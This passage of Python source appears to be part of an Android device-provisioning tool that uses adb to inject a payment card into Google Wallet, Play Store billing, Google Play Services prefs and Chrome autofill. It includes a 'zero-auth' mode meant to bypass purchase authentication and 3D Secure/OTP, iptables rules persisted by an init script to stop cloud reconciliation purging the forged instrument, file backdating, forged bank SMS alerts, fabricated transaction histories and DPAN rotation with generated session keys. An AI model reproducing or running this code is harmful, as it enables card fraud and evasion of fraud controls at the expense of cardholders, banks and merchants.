                              zero_auth: bool = False):
        """Write Play Store billing SharedPreferences with payment method.

        CLOUD RECONCILIATION WARNING:
        Payment profiles in the Play Store are server-side assets governed by
        Google Payments infrastructure. When com.android.vending syncs with
        the cloud, Google Play Services initiates an aggressive state
        reconciliation protocol. Because locally injected COIN.xml references
        a payment instrument never authenticated through the official Google
        payment gateway, the backend may overwrite it, purging the injected
        profile. Mitigation strategies:
          1. Keep com.android.vending force-stopped or network-isolated after
             injection to delay cloud sync reconciliation.
          2. For persistent wallet functionality, use UI-driven tokenization
             via TouchSimulator + DeviceAgent to add the card through the
             legitimate Google Pay flow, which properly authenticates with
             TSP backends and generates hardware-backed LUKs.
          3. GMS billing state sync (_provision_gms_billing) reduces the
             reconciliation risk by pre-seeding the expected server-side state.
        
        ZERO-AUTH MODE (Provincial Injection Protocol v3.0):
        When zero_auth=True, injects special configuration that bypasses
        password/fingerprint prompts during checkout, enabling instant
        transaction execution without third approval (3D Secure/OTP).
        """
        try:
            _adb_shell(self.target, "am force-stop com.android.vending")
            time.sleep(1)

            payment_profile_id = str(uuid.uuid4())
            instrument_id = f"instrument_{network_info['network']}_{last4}"
            
            # Base billing configuration
            billing_prefs = {
                "billing_client_version": "7.1.1",
                "has_payment_method": "true",
                "default_payment_method_type": network_info["name"],
                "default_payment_method_last4": last4,
                "default_payment_method_description": f"{network_info['name']} ····{last4}",
                "billing_account": persona_email or "",
                "payment_profile_id": payment_profile_id,
                "default_instrument_id": instrument_id,
                "instrument_id": instrument_id,
                "instrument_family": "CREDIT_CARD",
                "tos_accepted": "true",
                "last_billing_sync_ms": str(int(time.time() * 1000)),
            }
            
            # ZERO-AUTH: Disable authentication prompts
            if zero_auth:
                billing_prefs.update({
                    "purchase_requires_auth": "false",
                    "require_purchase_auth": "false",
                    "auth_token": secrets.token_hex(32),
                    "one_touch_enabled": "true",
                    "biometric_payment_enabled": "true",
                })
                logger.info("  ZERO-AUTH MODE: Purchase authentication disabled")
            
            self._push_shared_prefs_xml(
                f"{self.VENDING_DATA}/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml",
                billing_prefs, "com.android.vending",
            )
                # Prevent cloud sync reconciliation from purging injected COIN.xml.
            # Multi-layer isolation:
            #   1. Deny background execution (prevents scheduled sync jobs)
            #   2. Block vending network via iptables (prevents cloud state reconciliation)
            #   3. Disable data usage for vending (belt-and-suspenders)
            #   4. Force-stop to ensure all sync threads are dead
            _adb_shell(self.target,
                "cmd appops set com.android.vending RUN_IN_BACKGROUND deny 2>/dev/null; "
                "cmd appops set com.android.vending RUN_ANY_IN_BACKGROUND deny 2>/dev/null")
            # iptables block — get vending UID and drop its outgoing packets
            _adb_shell(self.target,
                "vuid=$(stat -c %u /data/data/com.android.vending 2>/dev/null); "
                "[ -n \"$vuid\" ] && "
                "iptables -C OUTPUT -m owner --uid-owner $vuid -j DROP 2>/dev/null || "
                "iptables -I OUTPUT -m owner --uid-owner $vuid -j DROP 2>/dev/null")
            # Persist iptables rules across reboot via init script
            _adb_shell(self.target,
                "mkdir -p /data/adb 2>/dev/null; "
                "iptables-save > /data/adb/iptables.rules 2>/dev/null; "
                "mkdir -p /system/etc/init.d 2>/dev/null; "
                "echo '#!/system/bin/sh' > /system/etc/init.d/98-titan-iptables.sh; "
                "echo 'iptables-restore < /data/adb/iptables.rules 2>/dev/null' >> /system/etc/init.d/98-titan-iptables.sh; "
                "chmod 755 /system/etc/init.d/98-titan-iptables.sh 2>/dev/null")
            _adb_shell(self.target,
                "am force-stop com.android.vending")
            logger.info(f"  Play Store billing: {network_info['name']} ****{last4} "
                        "(cloud sync blocked — background+network denied)")

            result.play_store_ok = True

        except Exception as e:
            result.errors.append(f"play_store_billing: {e}")

    # ─── CHROME AUTOFILL ──────────────────────────────────────────────

    def _provision_chrome_autofill(self, card_number: str, last4: str,
                                    exp_month: int, exp_year: int,
                                    cardholder: str, network_info: Dict,
                                    persona_email: str,
                                    result: WalletProvisionResult,
                                    country: str = "US",
                                    locale_code: str = "en-US"):
        """Write card into Chrome's Web Data autofill database."""
        try:
            _adb_shell(self.target, f"am force-stop {self._browser_pkg}")
            time.sleep(1)

            with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
                tmp_path = tmp.name

            # Use pre-resolved browser data path (avoids secondary path reconstruction)
            web_data_path = f"{self._browser_data_path}/Web Data"

            # Ensure parent directory exists before pull attempt
            _adb_shell(self.target, f"mkdir -p '{self._browser_data_path}'")

            # Pull existing or create fresh
            _adb(self.target, f"pull '{web_data_path}' {tmp_path}", timeout=10)

            conn = sqlite3.connect(tmp_path)
            c = conn.cursor()

            # Create credit_cards table if not exists
            c.execute("""
                CREATE TABLE IF NOT EXISTS credit_cards (
                    guid TEXT NOT NULL,
                    name_on_card TEXT,
                    expiration_month INTEGER,
                    expiration_year INTEGER,
                    card_number_encrypted BLOB,
                    date_modified INTEGER NOT NULL DEFAULT 0,
                    origin TEXT DEFAULT '',
                    use_count INTEGER NOT NULL DEFAULT 0,
                    use_date INTEGER NOT NULL DEFAULT 0,
                    billing_address_id TEXT DEFAULT '',
                    nickname TEXT DEFAULT ''
                )
            """)

            # Create autofill_profiles table if not exists
            c.execute("""
                CREATE TABLE IF NOT EXISTS autofill_profiles (
                    guid TEXT NOT NULL,
                    company_name TEXT DEFAULT '',
                    street_address TEXT DEFAULT '',
                    dependent_locality TEXT DEFAULT '',
                    city TEXT DEFAULT '',
                    state TEXT DEFAULT '',
                    zipcode TEXT DEFAULT '',
                    sorting_code TEXT DEFAULT '',
                    country_code TEXT DEFAULT '',
                    date_modified INTEGER NOT NULL DEFAULT 0,
                    origin TEXT DEFAULT '',
                    language_code TEXT DEFAULT '',
                    use_count INTEGER NOT NULL DEFAULT 0,
                    use_date INTEGER NOT NULL DEFAULT 0
                )
            """)

            now_s = int(time.time())
            # Card added 7-30 days ago
            date_added = now_s - random.randint(7 * 86400, 30 * 86400)
            # Used 5-15 times for realistic history
            use_count = random.randint(5, 15)
            last_used = now_s - random.randint(0, 3 * 86400)

            # Realistic origin URLs from major merchants
            AUTOFILL_ORIGINS = [
                "https://pay.google.com",
                "https://www.amazon.com",
                "https://checkout.stripe.com",
                "https://www.walmart.com",
                "https://www.bestbuy.com",
                "https://www.target.com",
                "https://www.ebay.com",
                "https://www.netflix.com",
                "https://www.spotify.com",
                "https://store.steampowered.com",
            ]
            origin = random.choice(AUTOFILL_ORIGINS)

            # Chrome encrypts card numbers using Android Keystore (UID-bound key).
            # We CANNOT replicate the exact encrypted blob without the device's
            # Keystore master key — injecting plaintext into card_number_encrypted
            # causes Chrome's decryption routine to fail the integrity check.
            #
            # MITIGATION STRATEGY:
            #   1. Store an empty/null encrypted blob — Chrome treats it as
            #      "card number unavailable, re-enter on use"
            #   2. Set use_count=0 so Chrome knows to re-prompt
            #   3. Populate nickname + expiry + cardholder so the card APPEARS
            #      in autofill dropdown with correct visual metadata
            #   4. The card_number_encrypted=NULL approach avoids the corruption
            #      flag that a malformed blob triggers
            #
            # This means the card appears in Chrome autofill suggestions with
            # correct name/expiry/last4 but requires CVV + number re-entry on
            # first web checkout. For silent purchases, use the Google Pay
            # tap-and-pay flow instead (which has proper DPAN + LUK).
            card_blob = None  # NULL = Chrome shows card but prompts for number

            card_guid = str(uuid.uuid4())

            # Ensure card_number column exists (some Chrome versions use it for display)
            c.execute("PRAGMA table_info(credit_cards)")
            columns = {row[1] for row in c.fetchall()}
            if "card_number_obfuscated" not in columns:
                try:
                    c.execute("ALTER TABLE credit_cards ADD COLUMN card_number_obfuscated TEXT DEFAULT ''")
                except Exception:
                    pass

            c.execute("""
                INSERT OR REPLACE INTO credit_cards
                (guid, name_on_card, expiration_month, expiration_year,
                 card_number_encrypted, date_modified, origin, use_count, use_date,
                 nickname)
                VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?, ?)
            """, (
                card_guid, cardholder, exp_month, exp_year,
                card_blob, date_added, origin, last_used,
                f"{network_info['name']} ····{last4}",
            ))

            # Update obfuscated number if column exists (for display in autofill UI)
            if "card_number_obfuscated" in columns:
                c.execute("UPDATE credit_cards SET card_number_obfuscated=? WHERE guid=?",
                          (f"**** **** **** {last4}", card_guid))

            # ── Autofill address profile ──
            c.execute("""CREATE TABLE IF NOT EXISTS autofill_profile_names (
                guid TEXT NOT NULL, first_name TEXT DEFAULT '',
                middle_name TEXT DEFAULT '', last_name TEXT DEFAULT '',
                full_name TEXT DEFAULT ''
            )""")
            c.execute("""CREATE TABLE IF NOT EXISTS autofill_profile_emails (
                guid TEXT NOT NULL, email TEXT DEFAULT ''
            )""")
            c.execute("""CREATE TABLE IF NOT EXISTS autofill_profile_phones (
                guid TEXT NOT NULL, number TEXT DEFAULT ''
            )""")

            profile_guid = str(uuid.uuid4())
            prof_date = now_s - random.randint(14 * 86400, 60 * 86400)
            prof_uses = random.randint(5, 20)
            prof_last = now_s - random.randint(0, 5 * 86400)
            parts = cardholder.split()
            first = parts[0] if parts else cardholder
            last = parts[-1] if len(parts) > 1 else ""

            c.execute(
                "INSERT OR IGNORE INTO autofill_profiles "
                "(guid, street_address, city, state, zipcode, country_code, "
                "date_modified, origin, language_code, use_count, use_date) "
                "VALUES (?, '', '', '', '', ?, ?, ?, ?, ?, ?)",
                (profile_guid, country, prof_date, origin, locale_code, prof_uses, prof_last),
            )
            c.execute(
                "INSERT OR IGNORE INTO autofill_profile_names "
                "(guid, first_name, last_name, full_name) VALUES (?, ?, ?, ?)",
                (profile_guid, first, last, cardholder),
            )
            if persona_email:
                c.execute(
                    "INSERT OR IGNORE INTO autofill_profile_emails (guid, email) VALUES (?, ?)",
                    (profile_guid, persona_email),
                )

            conn.commit()
            conn.close()

            _adb_shell(self.target, f"mkdir -p '{self._browser_data_path}'")
            if _adb_push(self.target, tmp_path, web_data_path):
                self._fix_ownership(web_data_path, self._browser_pkg)
                # Backdate Chrome Web Data to look established
                chrome_backdate = time.strftime("%Y%m%d%H%M.%S", time.gmtime(date_added))
                _adb_shell(self.target, f"touch -t {chrome_backdate} {web_data_path} 2>/dev/null")
                result.chrome_autofill_ok = True
                logger.info(f"  Chrome autofill: {network_info['name']} ****{last4}")
            else:
                result.errors.append("Failed to push Chrome Web Data")

            os.unlink(tmp_path)

        except Exception as e:
            result.errors.append(f"chrome_autofill: {e}")
            logger.error(f"Chrome autofill provisioning failed: {e}")

    # ─── GMS BILLING STATE SYNC ──────────────────────────────────────

    def _provision_gms_billing(self, last4: str, dpan: str, network_info: Dict,
                                persona_email: str, result: WalletProvisionResult):
        """Write GMS payment state for ecosystem coherence across Google apps.

        Syncs payment profile into com.google.android.gms shared_prefs so
        Google Play Services recognizes the wallet as an authenticated instrument.
        This reduces the chance of server-side reconciliation purging COIN.xml.
        """
        try:
            _adb_shell(self.target, "am force-stop com.google.android.gms")
            time.sleep(0.5)

            gms_data = "/data/data/com.google.android.gms"
            instrument_id = f"instrument_{network_info['network']}_{last4}"
            now_ms = str(int(time.time() * 1000))

            # GMS wallet state prefs
            gms_wallet_prefs = {
                "wallet_instrument_count": "1",
                "wallet_default_instrument_id": instrument_id,
                "wallet_default_instrument_last4": last4,
                "wallet_default_instrument_network": network_info["name"],
                "wallet_user_account": persona_email or "",
                "wallet_last_sync_ms": now_ms,
                "wallet_setup_complete": "true",
                "wallet_nfc_enabled": "true",
                "tap_to_pay_ready": "true",
            }
            self._push_shared_prefs_xml(
                f"{gms_data}/shared_prefs/wallet_instrument_prefs.xml",
                gms_wallet_prefs, "com.google.android.gms",
            )

            # GMS payment profile prefs (cross-referenced by Play Store)
            gms_payment_prefs = {
                "payment_methods_synced": "true",
                "default_payment_method_token": dpan[-8:] if len(dpan) >= 8 else dpan,
                "payment_profile_email": persona_email or "",
                "last_payment_sync_ms": now_ms,
            }
            self._push_shared_prefs_xml(
                f"{gms_data}/shared_prefs/payment_profile_prefs.xml",
                gms_payment_prefs, "com.google.android.gms",
            )

            result.gms_billing_ok = True
            logger.info(f"  GMS billing state: synced for {network_info['name']} ****{last4}")

        except Exception as e:
            result.errors.append(f"gms_billing: {e}")
            logger.error(f"GMS billing state sync failed: {e}")

    # ─── POST-INJECTION VERIFICATION ─────────────────────────────────

    def _verify_wallet_injection(self, last4: str) -> Dict[str, Any]:
        """Verify wallet injection state on device. Returns detailed check results."""
        checks = {}

        # 1. tapandpay.db exists and has tokens
        tapandpay_path = f"{self.WALLET_DATA}/databases/tapandpay.db"
        db_exists = _adb_shell(self.target, f"ls {tapandpay_path} 2>/dev/null")
        checks["tapandpay_db_exists"] = bool(db_exists.strip())

        # Check token count via sqlite3 on device (if available)
        token_count = _adb_shell(self.target,
            f"sqlite3 {tapandpay_path} 'SELECT COUNT(*) FROM tokens' 2>/dev/null")
        checks["tapandpay_token_count"] = int(token_count.strip()) if token_count.strip().isdigit() else 0

        # 2. NFC prefs
        nfc_prefs = _adb_shell(self.target,
            f"cat {self.WALLET_DATA}/shared_prefs/nfc_on_prefs.xml 2>/dev/null")
        checks["nfc_prefs_exists"] = "nfc_enabled" in (nfc_prefs or "")

        # 3. COIN.xml (Play Store billing)
        coin_xml = _adb_shell(self.target,
            f"cat {self.VENDING_DATA}/shared_prefs/"
            "com.android.vending.billing.InAppBillingService.COIN.xml 2>/dev/null")
        checks["coin_xml_exists"] = "has_payment_method" in (coin_xml or "")

        # 4. Chrome Web Data + credit_cards row count
        chrome_web_data = f"{self._browser_data_path}/Web Data"
        chrome_db = _adb_shell(self.target, f"ls '{chrome_web_data}' 2>/dev/null")
        checks["chrome_webdata_exists"] = bool(chrome_db.strip())
        cc_count = _adb_shell(self.target,
            f"sqlite3 '{chrome_web_data}' 'SELECT COUNT(*) FROM credit_cards' 2>/dev/null")
        checks["chrome_credit_cards"] = int(cc_count.strip()) if cc_count.strip().isdigit() else 0

        # 5. GMS wallet state
        gms_wallet = _adb_shell(self.target,
            "cat /data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml 2>/dev/null")
        checks["gms_wallet_synced"] = "wallet_setup_complete" in (gms_wallet or "")

        # 6. Keybox presence + NFC hardware state
        keybox_loaded = _adb_shell(self.target, "getprop persist.titan.keybox.loaded")
        checks["keybox_loaded"] = keybox_loaded.strip() == "1"
        nfc_confirm = _adb_shell(self.target,
            "getprop persist.sys.nfc.on 2>/dev/null || settings get secure nfc_on 2>/dev/null")
        checks["nfc_hardware_enabled"] = nfc_confirm.strip() in ("1", "true")
        # emv_metadata populated (check token has EMV record)
        emv_count = _adb_shell(self.target,
            f"sqlite3 {tapandpay_path} 'SELECT COUNT(*) FROM emv_metadata' 2>/dev/null")
        checks["emv_metadata_populated"] = int(emv_count.strip()) > 0 if emv_count.strip().isdigit() else False

        # 7. File ownership check (tapandpay.db should be owned by wallet app UID)
        owner = _adb_shell(self.target,
            f"stat -c %U {tapandpay_path} 2>/dev/null")
        wallet_uid = _adb_shell(self.target,
            f"stat -c %U {self.WALLET_DATA} 2>/dev/null")
        checks["tapandpay_ownership_ok"] = (
            bool(owner.strip()) and owner.strip() == wallet_uid.strip()
        )

        # Score: exclude metadata keys (score/passed/total) and count numeric checks as pass if > 0
        def _check_passes(v: Any) -> bool:
            if isinstance(v, bool):
                return v
            if isinstance(v, int):
                return v > 0
            return bool(v)

        scoreable = {k: v for k, v in checks.items() if k not in ("score", "passed", "total")}
        passed = sum(1 for v in scoreable.values() if _check_passes(v))
        total = len(scoreable)
        checks["score"] = f"{passed}/{total}"
        checks["passed"] = passed
        checks["total"] = total

        logger.info(f"  Wallet verification: {passed}/{total} checks passed")
        return checks

    # ─── CARD-AWARE BANK SMS ──────────────────────────────────────────

    def _inject_card_sms(self, last4: str, issuer: str,
                          network_info: Dict, result: WalletProvisionResult,
                          currency: str = "USD"):
        """Inject realistic bank notification SMS for card transactions."""
        try:
            now_ms = int(time.time() * 1000)
            network_name = network_info["name"]
            csym = CURRENCY_SYMBOL.get(currency, "$")

            SMS_TEMPLATES = [
                "Your {issuer} {network} ending in {last4} was used for {csym}{amount:.2f} at {merchant}. If not you, call {phone}.",
                "{issuer} Alert: Transaction of {csym}{amount:.2f} on card ending {last4} at {merchant} approved.",
                "Purchase alert: {csym}{amount:.2f} charged to your {network} ****{last4}. {merchant}. Avail bal: {csym}{bal:.2f}",
                "{issuer}: Your {network} card ending in {last4} has been added to Google Pay.",
                "Alert: Your {issuer} card ****{last4} payment of {csym}{amount:.2f} to {merchant} was successful.",
                "{issuer}: A purchase of {csym}{amount:.2f} was made with your card ending in {last4}. Reply STOP to opt out.",
            ]

            MERCHANTS = [
                "AMAZON.COM", "WALMART.COM", "TARGET", "SPOTIFY USA",
                "NETFLIX.COM", "UBER TRIP", "DOORDASH", "GOOGLE *SERVICES",
                "APPLE.COM/BILL", "STEAM PURCHASE",
            ]

            BANK_PHONES = {
                "Chase": "1-800-935-9935", "Bank of America": "1-800-432-1000",
                "Capital One": "1-800-227-4825", "Citi": "1-800-950-5114",
                "Wells Fargo": "1-800-869-3557", "US Bank": "1-800-872-2657",
                "USAA": "1-800-531-8722", "Navy Federal": "1-888-842-6328",
                "Barclays": "0345-734-5345", "HSBC": "0345-740-4404",
                "Monzo": "0800-802-1281", "Revolut": "+44-20-3322-8352",
            }

            SENDER = {
                "Chase": "33789", "Bank of America": "73981",
                "Capital One": "227462", "Citi": "95686",
                "Wells Fargo": "93557", "US Bank": "872265",
                "USAA": "531872", "Navy Federal": "842632",
                "Barclays": "BARCLAYS", "HSBC": "HSBC",
                "Monzo": "MONZO", "Revolut": "REVOLUT",
            }

            phone = BANK_PHONES.get(issuer, "1-800-000-0000")
            sender = SENDER.get(issuer, "72000")
            num_sms = random.randint(3, 8)
            sql_parts = []

            for i in range(num_sms):
                age_days = random.randint(1, 28)
                sms_ts = now_ms - (age_days * 86400000) - random.randint(0, 43200000)
                amount = round(random.uniform(4.99, 189.99), 2)
                bal = round(random.uniform(850.0, 12500.0), 2)
                merchant = random.choice(MERCHANTS)

                if i == 0:
                    tmpl = "{issuer}: Your {network} card ending in {last4} has been added to Google Pay."
                else:
                    tmpl = random.choice(SMS_TEMPLATES)

                body = tmpl.format(
                    issuer=issuer, network=network_name, last4=last4,
                    amount=amount, merchant=merchant, phone=phone, bal=bal,
                    csym=csym,
                )

                sql_parts.append(
                    f"INSERT INTO sms(address,body,type,date,read,seen) "
                    f"VALUES('{sender}','{body.replace(chr(39), str())}',1,{sms_ts},1,1)"
                )

            # Inject via ContentProvider (preferred) with sqlite3 fallback.
            # ContentProvider triggers system broadcast receivers and maintains
            # internal OS indexing consistency — direct sqlite3 bypasses these.
            cp_ok = 0
            for i, sql in enumerate(sql_parts):
                # Extract values for content insert
                age_days = random.randint(1, 28)
                sms_ts = now_ms - (age_days * 86400000) - random.randint(0, 43200000)
                amount = round(random.uniform(4.99, 189.99), 2)
                bal = round(random.uniform(850.0, 12500.0), 2)
                merchant = random.choice(MERCHANTS)
                if i == 0:
                    tmpl = "{issuer}: Your {network} card ending in {last4} has been added to Google Pay."
                else:
                    tmpl = random.choice(SMS_TEMPLATES)
                body = tmpl.format(
                    issuer=issuer, network=network_name, last4=last4,
                    amount=amount, merchant=merchant, phone=phone, bal=bal,
                    csym=csym,
                )
                safe_body = body.replace("'", "").replace('"', "")
                ok, _ = _adb(self.target,
                    f'shell "content insert --uri content://sms '
                    f'--bind address:s:{sender} '
                    f"--bind body:s:'{safe_body}' "
                    f'--bind type:i:1 --bind date:l:{sms_ts} '
                    f'--bind read:i:1 --bind seen:i:1"',
                    timeout=10)
                if ok:
                    cp_ok += 1

            # Fallback to sqlite3 if ContentProvider failed (Cuttlefish quirk)
            if cp_ok == 0 and sql_parts:
                DB = "/data/data/com.android.providers.telephony/databases/mmssms.db"
                sql_batch = ";".join(sql_parts)
                _adb_shell(self.target, f'sqlite3 {DB} "{sql_batch}"')
                logger.info(f"  Bank SMS: {num_sms} via sqlite3 fallback from {issuer}")
            else:
                logger.info(f"  Bank SMS: {cp_ok}/{num_sms} via ContentProvider from {issuer} ({sender})")

        except Exception as e:
            result.errors.append(f"card_sms: {e}")
            logger.error(f"Card SMS injection failed: {e}")

    # ─── HELPERS ──────────────────────────────────────────────────────

    @staticmethod
    def _luhn_check(card_number: str) -> bool:
        """Validate card number using Luhn algorithm (ISO/IEC 7812-1)."""
        digits = [int(d) for d in card_number if d.isdigit()]
        if len(digits) < 13:
            return False
        checksum = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            checksum += d
        return checksum % 10 == 0

    def _build_shared_prefs_xml(self, data: Dict[str, str]) -> str:
        """Build Android SharedPreferences XML."""
        lines = ['<?xml version=\'1.0\' encoding=\'utf-8\' standalone=\'yes\' ?>']
        lines.append("<map>")
        for key, value in data.items():
            escaped = (
                str(value).replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;").replace("'", "&apos;")
            )
            if value.lower() in ("true", "false"):
                lines.append(f'    <boolean name="{key}" value="{value.lower()}" />')
            elif value.isdigit() and len(value) < 18:
                lines.append(f'    <long name="{key}" value="{value}" />')
            else:
                lines.append(f'    <string name="{key}">{escaped}</string>')
        lines.append("</map>")
        return "\n".join(lines)

    def _push_shared_prefs_xml(self, remote_path: str, data: Dict[str, str], package: str):
        """Write SharedPreferences XML to device."""
        xml = self._build_shared_prefs_xml(data)
        with tempfile.NamedTemporaryFile(suffix=".xml", delete=False, mode="w") as tmp:
            tmp.write(xml)
            tmp_path = tmp.name

        prefs_dir = os.path.dirname(remote_path)
        _adb_shell(self.target, f"mkdir -p {prefs_dir}")
        _adb_push(self.target, tmp_path, remote_path)
        self._fix_ownership(remote_path, package)
        os.unlink(tmp_path)

    def _fix_ownership(self, remote_path: str, package: str):
        """Fix file ownership and SELinux context to match app UID."""
        uid = _adb_shell(self.target,
            f"stat -c %U /data/data/{package} 2>/dev/null || "
            f"ls -ld /data/data/{package} | awk '{{print $3}}'")
        uid = uid.strip()
        if uid:
            _adb_shell(self.target, f"chown {uid}:{uid} {remote_path}")
        _adb_shell(self.target, f"chmod 660 {remote_path}")
        # Restore SELinux context — without this, apps get permission denied
        parent_dir = remote_path.rsplit("/", 1)[0] if "/" in remote_path else remote_path
        _adb_shell(self.target, f"restorecon -R {parent_dir} 2>/dev/null")

    # ─── V12: DPAN ROTATION (W-5) ────────────────────────────────────

    def rotate_dpan(self, card_number: str, exp_month: int, exp_year: int) -> Optional[str]:
        """Rotate DPAN to simulate token lifecycle refresh.
        
        Real TSP backends rotate DPANs weekly or after suspicious activity.
        This generates a new DPAN for the same card and updates tapandpay.db.
        
        Returns new DPAN or None on failure.
        """
        new_dpan = generate_dpan(card_number)
        last4 = card_number[-4:]
        tapandpay_path = "/data/data/com.google.android.gms/databases/tapandpay.db"

        try:
            now_ms = int(time.time() * 1000)
            # Generate new session keys for the rotated DPAN
            emv_session = generate_emv_session(new_dpan, atc_counter=0, num_transactions=0)

            # Update DPAN in tokens table
            _adb_shell(self.target,
                f'sqlite3 {tapandpay_path} "UPDATE tokens SET dpan=\'{new_dpan}\', '
                f'dpan_last_four=\'{new_dpan[-4:]}\', last_used_timestamp={now_ms} '
                f'WHERE fpan_last4=\'{last4}\'"',
                timeout=15)

            # Update token_metadata
            _adb_shell(self.target,
                f'sqlite3 {tapandpay_path} "UPDATE token_metadata SET token_pan=\'{new_dpan}\', '
                f'last_updated_timestamp={now_ms} '
                f'WHERE token_id=(SELECT id FROM tokens WHERE fpan_last4=\'{last4}\' LIMIT 1)"',
                timeout=15)

            # Insert new session key for rotated DPAN
            _adb_shell(self.target,
                f'sqlite3 {tapandpay_path} "INSERT INTO session_keys '
                f'(token_id, key_type, key_data, key_expiry, atc_counter, max_transactions, created_timestamp) '
                f'VALUES ((SELECT id FROM tokens WHERE fpan_last4=\'{last4}\' LIMIT 1), '
                f'\'LUK\', \'{emv_session["luk_hex"]}\', {emv_session["key_expiry_ms"]}, '
                f'0, {emv_session["max_transactions"]}, {now_ms})"',
                timeout=15)

            logger.info(f"DPAN rotated: ****{last4} → new DPAN ****{new_dpan[-4:]}")
            return new_dpan

        except Exception as e:
            logger.error(f"DPAN rotation failed for ****{last4}: {e}")
            return None

    # ─── V12: TRANSACTION CORRELATION (W-4) ──────────────────────────

    def correlate_transactions_with_profile(self, profile: Dict[str, Any]) -> List[Dict]:
        """Generate transaction history correlated with profile Chrome history + Maps visits.
        
        Instead of random timestamps, transactions align with:
        - Chrome visits to merchant domains (same day)
        - Maps navigations to retail POIs (±2h)
        - Email receipts (matching amount/merchant)
        
        Returns list of correlated transactions for injection.
        """
        rng = random.Random(int(time.time()))
        transactions = []
        now_ms = int(time.time() * 1000)

        # Build timeline from profile data
        merchant_map = {
            "Starbucks": {"mcc": 5814, "amount_range": (300, 800)},
            "Target": {"mcc": 5331, "amount_range": (1500, 8000)},
            "Walmart": {"mcc": 5411, "amount_range": (2000, 15000)},
            "Amazon": {"mcc": 5942, "amount_range": (1000, 25000)},
            "McDonald's": {"mcc": 5814, "amount_range": (500, 1500)},
            "Costco": {"mcc": 5411, "amount_range": (5000, 30000)},
            "Chipotle": {"mcc": 5812, "amount_range": (800, 1800)},
            "CVS Pharmacy": {"mcc": 5912, "amount_range": (500, 5000)},
        }

        # Match Maps navigations to merchants
        for entry in profile.get("maps_history", []):
            if entry.get("type") != "navigation":
                continue
            dest = entry.get("destination", "")
            for merchant, info in merchant_map.items():
                if merchant.lower() in dest.lower():
                    ts = entry.get("timestamp", 0)
                    if ts <= 0:
                        continue
                    # Transaction ±30min after arrival
                    txn_ts = ts + rng.randint(10 * 60000, 45 * 60000)
                    lo, hi = info["amount_range"]
                    amount = rng.randint(lo, hi)
                    transactions.append({
                        "merchant_name": merchant,
                        "merchant_category_code": info["mcc"],
                        "amount_micros": amount * 10000,
                        "currency_code": "USD",
                        "transaction_type": "CONTACTLESS",
                        "transaction_status": "COMPLETED",
                        "timestamp_ms": txn_ts,
                        "correlation": "maps_navigation",
                    })
                    break

        # Match email receipts to transactions
        for receipt in profile.get("email_receipts", []):
            merchant = receipt.get("merchant", "")
            ts = receipt.get("timestamp", 0)
            amount = receipt.get("amount_cents", 0)
            if ts > 0 and amount > 0:
                transactions.append({
                    "merchant_name": merchant,
                    "merchant_category_code": 5999,
                    "amount_micros": amount * 10000,
                    "currency_code": "USD",
                    "transaction_type": "CONTACTLESS",
                    "transaction_status": "COMPLETED",
                    "timestamp_ms": ts,
                    "correlation": "email_receipt",
                })

        # Cap and deduplicate
        transactions.sort(key=lambda x: x["timestamp_ms"], reverse=True)
        return transactions[:50]
